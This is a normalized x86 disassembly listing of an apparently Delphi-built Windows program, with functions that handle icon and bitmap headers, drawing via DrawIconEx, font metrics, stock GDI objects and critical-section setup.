mov [ ebp - 0x18 ] 0xc
mov eax [ ebp - 0x20 ]
cmp [ eax + 0x3e ] 0x8
ja r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x20 ]
add eax 0x18
call sub_413c0c
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebp - 0x20 ]
cmp [ eax + 0x70 ] 0x0
jne r-xdata
mov eax [ ebp - 0x20 ]
mov eax [ eax + 0x50 ]
cmp eax [ ebp - 0x14 ]
jae r-xdata
mov eax [ ebp - 0x20 ]
mov cx [ eax + 0x3e ]
mov eax 0x1
shl eax cl
lea eax [ eax + eax * 2 ]
add [ ebp - 0x18 ] eax
mov eax [ ebp - 0x20 ]
cmp [ eax + 0x70 ] 0x0
je r-xdata
mov eax [ ebp - 0x20 ]
cmp [ eax + 0x50 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x30 ] eax
mov eax [ ebp - 0x18 ]
add eax 0xe
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov eax [ ebp - 0x20 ]
mov eax [ eax + 0x50 ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x32 ]
mov ecx 0xe
mov eax [ ebp - 0x8 ]
call sub_43eb60
mov eax [ ebp - 0x20 ]
lea edx [ eax + 0x30 ]
mov ecx 0x28
mov eax [ ebp - 0x8 ]
call sub_43eb60
mov eax [ ebp - 0x20 ]
cmp [ eax + 0x3e ] 0x8
jbe r-xdata
mov eax [ ebp - 0x20 ]
add eax 0x30
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x3e ] 0xc
mov eax [ ebp - 0x24 ]
mov ax [ eax + 0x4 ]
mov [ ebp - 0x3a ] ax
mov eax [ ebp - 0x24 ]
mov ax [ eax + 0x8 ]
mov [ ebp - 0x38 ] ax
mov [ ebp - 0x36 ] 0x1
mov eax [ ebp - 0x24 ]
mov ax [ eax + 0xe ]
mov [ ebp - 0x34 ] ax
lea edx [ ebp - 0x32 ]
mov ecx 0xe
mov eax [ ebp - 0x8 ]
call sub_43eb60
lea edx [ ebp - 0x3e ]
mov ecx 0xc
mov eax [ ebp - 0x8 ]
call sub_43eb60
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0x20 ]
mov [ edx + 0x50 ] eax
mov eax [ ebp - 0x20 ]
mov eax [ eax + 0x50 ]
cmp eax [ ebp - 0x14 ]
je r-xdata
mov eax [ ebp - 0x20 ]
cmp [ eax + 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x20 ]
movzx eax [ eax + 0x70 ]
xor ecx ecx
mov cl [ eax + rw-data ]
imul ecx [ ebp - 0x14 ]
lea edx [ ebp - 0x43e ]
mov eax [ ebp - 0x8 ]
call sub_43eb60
mov eax [ ebp - 0x20 ]
mov edx [ eax + 0x2c ]
mov eax [ ebp - 0x20 ]
mov ecx [ eax + 0x44 ]
mov eax [ ebp - 0x8 ]
call sub_43eb60
mov eax [ ebp - 0x20 ]
test [ eax + 0x40 ] 0x3
je r-xdata
lea edx [ ebp - 0x14 ]
lea eax [ ebp - 0x43e ]
call sub_4106b8
mov eax [ ebp - 0x20 ]
cmp [ eax + 0x70 ] 0x0
je r-xdata
mov eax [ ebp - 0x20 ]
cmp [ eax + 0x71 ] 0x0
jne r-xdata
mov eax [ ebp - 0x20 ]
lea edx [ eax + 0x58 ]
mov ecx 0xc
mov eax [ ebp - 0x8 ]
call sub_43eb60
lea edx [ ebp - 0x43e ]
mov ecx 0xff
mov eax [ ebp - 0x20 ]
mov eax [ eax + 0x10 ]
call sub_410a70
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x20 ]
cmp [ eax + 0x3e ] 0x8
jbe r-xdata
mov eax [ ebp - 0x14 ]
shl eax 0x2
add [ ebp - 0x10 ] eax
mov eax [ ebp - 0x14 ]
shl eax 0x2
add [ ebp - 0x18 ] eax
sub_416489
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor ecx ecx
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_416134
pop ecx
pop ecx
pop ebp
retn
sub_4164ac
push ebp
mov ebp esp
add esp 0xffffff9c
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov [ eax ] 0x2
mov eax [ ebp - 0x4 ]
call sub_415090
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
lea esi [ eax + 0x18 ]
lea edi [ ebp - 0x64 ]
mov ecx 0x15
[ edi ] [ esi ]
xor eax eax
mov [ ebp - 0x4c ] eax
xor eax eax
mov [ ebp - 0x50 ] eax
lea eax [ ebp - 0x64 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
push eax
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0x10 ]
mov eax [ ebp - 0x10 ]
mov edx [ eax + 0x10 ]
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x8 ]
call sub_413c7c
mov edx [ ebp - 0xc ]
mov [ edx ] eax
xor eax eax
push ebp
push sub_416543
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov eax [ eax + 0x10 ]
call sub_4142e4
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_416568
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_44c3d0
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
call sub_44c070
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_44c060
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_44c3c0
sub_4165a4
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x8 ] edx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
push eax
call DestroyIcon
sub_4165cc
push ebp
mov ebp esp
add esp 0xfffffff8
test dl dl
je r-xdata
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4115f4
mov eax [ ebp - 0x4 ]
mov [ eax + 0x19 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_44c040
mov edx [ ebp - 0x4 ]
mov [ edx + 0x20 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
call sub_413a00
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_44c370
mov eax [ ebp - 0x4 ]
pop ecx
pop ecx
pop ebp
retn
call sub_44c3c8
pop [ fs : 0x0 ]
add esp 0xc
sub_416634
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_44c3d0
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
call sub_413a10
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_43ccd0
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_44c3c0
sub_416670
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_44c1e8
test al al
je r-xdata
xor ecx ecx
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_416a04
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x20 ]
call sub_413a00
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
call sub_413a10
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x20 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x20 ] eax
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_43cd0c
pop ecx
pop ecx
pop ebp
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
sub_4166e8
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov dl [ r-xdata ]
mov eax [ ebp - 0x8 ]
call sub_40fd6c
push 0x3
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_416770
push eax
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0xc ]
mov eax [ eax ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call DrawIconEx
mov esp ebp
pop ebp
retn
sub_416739
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xfffffff4
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov [ ebp - 0x5 ] al
mov al [ ebp - 0x5 ]
mov esp ebp
pop ebp
retn
mov al 0x1
sub_416770
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4167ec
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_416794
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov eax [ eax + 0x14 ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
push 0xc
call GetSystemMetrics
mov [ ebp - 0x8 ] eax
sub_4167c0
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov eax [ eax + 0x10 ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
push 0xb
call GetSystemMetrics
mov [ ebp - 0x8 ] eax
sub_4167ec
push ebp
mov ebp esp
add esp 0xffffffec
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x14 ]
cmp [ eax + 0xc ] 0x0
je r-xdata
xor edx edx
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0xc ]
call sub_43eaa4
lea edx [ ebp - 0xa ]
mov ecx 0x6
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0xc ]
call sub_43eb18
mov ax [ ebp - 0x8 ]
sub ax 0x1
jb r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x14 ]
mov [ edx + 0x8 ] eax
push 0x6
mov eax [ ebp - 0x4 ]
add eax 0x24
push eax
mov eax [ ebp - 0x14 ]
add eax 0x10
push eax
movzx ecx [ ebp - 0x6 ]
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0xc ]
call sub_410d70
jmp r-xdata
jmp r-xdata
call sub_410054
sub_416880
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_44c040
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41691c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_416770
cmp eax [ rw-data ]
jne r-xdata
call sub_410054
mov eax [ ebp - 0x4 ]
call sub_416770
mov edx eax
xor ecx ecx
mov eax [ ebp - 0x8 ]
call sub_4113d8
lea eax [ ebp - 0xe ]
xor ecx ecx
mov edx 0x6
call sub_44bd90
lea edx [ ebp - 0xe ]
mov ecx 0x6
mov eax [ ebp - 0x8 ]
call sub_43eb60
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0xc ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_416944
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_44c040
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4169d9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_43eac4
push eax
mov eax [ ebp - 0x8 ]
call sub_43ea80
pop edx
sub edx eax
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx ]
mov eax [ ebp - 0xc ]
call sub_43eac4
mov ecx eax
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_43eb18
lea edx [ ebp - 0x12 ]
mov ecx 0x6
mov eax [ ebp - 0xc ]
call sub_43eb18
mov ax [ ebp - 0x10 ]
sub ax 0x2
jb r-xdata
mov ecx [ ebp - 0xc ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_416a04
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_410054
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4169de
mov eax [ ebp - 0xc ]
call sub_44c070
call sub_44c7c4
call sub_44c818
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_416a04
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_44c040
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_416a4f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x8 ] edx
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0xc ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x10 ]
call sub_413a00
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
call sub_413a10
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x20 ] edx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_416a8c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor ecx ecx
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_416a04
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop ecx
pop ecx
pop ebp
retn
sub_416ab4
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_410008
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
jmp r-xdata
pop ecx
pop ecx
pop ebp
retn
sub_416af8
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_410008
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x24 ] eax
jmp r-xdata
pop ecx
pop ecx
pop ebp
retn
sub_416b2c
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_416880
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov eax [ eax + 0xc ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
call sub_43eac4
mov ecx eax
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_43eb60
mov esp ebp
pop ebp
retn
sub_416ba8
push ebp
mov ebp esp
push ecx
push 0x0
call GetDC
mov [ ebp - 0x4 ] eax
push 0x5a
mov eax [ ebp - 0x4 ]
push eax
call GetDeviceCaps
mov [ rw-data ] eax
mov eax [ ebp - 0x4 ]
push eax
push 0x0
call ReleaseDC
mov eax rw-data
mov edx 0xf
call sub_4107bc
mov [ rw-data ] eax
pop ecx
pop ebp
retn
sub_416be8
push ebp
mov ebp esp
add esp 0xffffffc0
mov [ ebp - 0x1 ] 0x1
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov al [ ebp - 0x1 ]
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call SelectObject
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call GetTextMetricsA
test eax eax
je r-xdata
mov al [ ebp - 0xc ]
mov [ ebp - 0x1 ] al
sub_416c40
push ebp
mov ebp esp
push ecx
push esi
push edi
push 0x48
mov eax [ rw-data ]
push eax
push 0x8
call MulDiv
neg eax
mov [ rw-data ] eax
mov eax [ rw-data ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
pop edi
pop esi
pop ecx
pop ebp
retn
call sub_416be8
mov [ ebp - 0x1 ] al
mov al [ ebp - 0x1 ]
sub al 0x80
jne r-xdata
mov esi r-xdata
mov edi rw-data
mov ecx 0x4
[ edi ] [ esi ]
push 0x48
mov eax [ rw-data ]
push eax
push 0x9
call MulDiv
neg eax
mov [ rw-data ] eax
mov al [ ebp - 0x1 ]
mov [ rw-data ] al
sub_416d18
push ebp
mov ebp esp
add esp 0xfffffff8
test dl dl
je r-xdata
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
add eax 0x8
push eax
call InitializeCriticalSection
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_44c370
mov eax [ ebp - 0x4 ]
pop ecx
pop ecx
pop ebp
retn
call sub_44c3c8
pop [ fs : 0x0 ]
add esp 0xc
sub_416d5c
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_44c3d0
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_416fb0
mov eax [ ebp - 0x4 ]
add eax 0x8
push eax
call DeleteCriticalSection
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_44c3c0
sub_416dc4
push ebp
mov ebp esp
add esp 0xffffffec
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_416d94
xor eax eax
push ebp
push sub_416e81
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x8 ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416e88
mov eax [ ebp - 0x4 ]
call sub_416dac
retn
mov eax 0x10
call sub_44ba5c
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ ebp - 0x14 ]
mov [ edx ] eax
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_416e90
mov edx [ ebp - 0x14 ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x8 ] edx
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0xc ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0xc ]
cmp eax [ ebp - 0xc ]
jne r-xdata
sub_416e90
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_414588
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_416f8d
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx 0x8
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx 0x8
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x10 ]
call sub_414c24
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x1c ]
mov eax [ eax + 0x14 ]
xor edx edx
call sub_40f4d0
mov eax [ ebp - 0x1c ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x8 ]
call sub_40f388
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
xor edx edx
xor eax eax
call sub_43b7c8
lea edx [ ebp - 0x2c ]
mov eax [ ebp - 0x1c ]
call sub_40f808
xor eax eax
mov [ ebp - 0x18 ] eax
mov edx [ ebp - 0x14 ]
and edx 0x80000001
jns r-xdata
dec eax
or eax 0xfffffffe
inc eax
cmp eax edx
jne r-xdata
dec edx
or edx 0xfffffffe
inc edx
inc [ ebp - 0x14 ]
cmp [ ebp - 0x14 ] 0x9
jne r-xdata
mov eax [ ebp - 0xc ]
push eax
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x1c ]
call sub_40fbe4
mov eax [ ebp - 0x18 ]
and eax 0x80000001
jns r-xdata
inc [ ebp - 0x18 ]
cmp [ ebp - 0x18 ] 0x9
jne r-xdata
xor eax eax
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x10 ]
call sub_414888
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_416fb0
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_416d94
xor eax eax
push ebp
push sub_417001
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417008
mov eax [ ebp - 0x4 ]
call sub_416dac
retn
mov esp ebp
pop ebp
retn
sub_417008
mov eax [ ebp - 0xc ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
call sub_44ba74
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x4 ]
call sub_44c070
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_416d94
xor eax eax
push ebp
push sub_417001
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417008
mov eax [ ebp - 0x4 ]
call sub_416dac
retn
mov esp ebp
pop ebp
retn
sub_417034
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
call sub_40e410
push eax
mov eax [ ebp - 0x4 ]
call sub_40e410
mov edx eax
mov eax [ rw-data ]
pop ecx
call sub_416dc4
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0xc ]
mov esp ebp
pop ebp
retn
sub_41707c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_417145
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41714c
retn
mov eax [ rw-data ]
call sub_44c070
mov eax [ rw-data ]
call sub_44c070
mov eax [ rw-data ]
call sub_44c070
call sub_413670
mov eax [ rw-data ]
call sub_44c070
mov eax [ rw-data ]
call sub_44c070
mov eax [ rw-data ]
call sub_44c070
mov eax [ rw-data ]
call sub_44c070
mov eax [ rw-data ]
call sub_44c070
mov eax [ rw-data ]
push eax
call DeleteObject
push rw-data
call DeleteCriticalSection
push rw-data
call DeleteCriticalSection
mov eax rw-data
mov ecx 0x12
mov edx [ r-xdata ]
call sub_44d340
mov eax rw-data
mov ecx 0x2a
mov edx [ r-xdata ]
call sub_44d340
sub_417150
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_416ba8
push rw-data
call InitializeCriticalSection
push rw-data
call InitializeCriticalSection
push 0x7
call GetStockObject
mov [ rw-data ] eax
push 0x5
call GetStockObject
mov [ rw-data ] eax
push 0xd
call GetStockObject
mov [ rw-data ] eax
push 0x7f00
push 0x0
call LoadIconA
mov [ rw-data ] eax
call sub_416c40
mov cx 0x2c
mov dl 0x1
mov eax [ sub_40db74 ]
call sub_40dbe8
mov [ rw-data ] eax
mov cx 0x10
mov dl 0x1
mov eax [ sub_40db74 ]
call sub_40dbe8
mov [ rw-data ] eax
mov cx 0x10
mov dl 0x1
mov eax [ sub_40db74 ]
call sub_40dbe8
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_416d18
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_43c874
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_43c874
mov [ rw-data ] eax
mov ecx sub_40e440
mov edx sub_40e468
mov eax [ r-xdata ]
call sub_43bd6c
mov ecx r-xdata
mov edx sub_40e6d0
mov eax [ r-xdata ]
call sub_43bd6c
sub_41738e
add dh bh
mov al [ 0x42cb ]
add [ eax ] al
add [ eax ] 0x0
